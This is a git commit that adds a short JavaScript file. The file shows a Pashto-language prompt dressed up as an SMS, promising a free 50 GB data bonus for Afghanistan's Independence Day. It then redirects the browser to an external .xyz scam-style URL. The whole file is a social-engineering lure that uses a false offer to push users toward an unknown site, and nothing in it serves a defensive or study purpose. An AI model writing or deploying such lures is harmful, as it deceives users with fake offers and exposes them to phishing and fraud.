6e604988f94f808a17dbc09cb085cb92cb4bfce5
newetijazz3 <newetijazz3@gmail.com>
2025-08-11 12:28:13 +0100

    Create afganindependence.js

---
+++ afganindependence.js
@@ -0,0 +1,5 @@
+var password = '۵۰ جي بي فعال کړئ'
+password=prompt('SMS: مبارک شه، تاسو د افغانستان د خپلواکۍ د ورځې د لمانځلو وړاندیز ۵۰ ګیګابایټ ترلاسه کولو وړ یاست، د فعالولو لپاره اوس Ok کلیک وکړئ. ','۵۰ جي بي فعال کړئ');
+if (password != '۵۰ جي بي فعال کړئ') {
+location.href='https://www.ikimette.xyz/afgan-independence-50gb';
+}
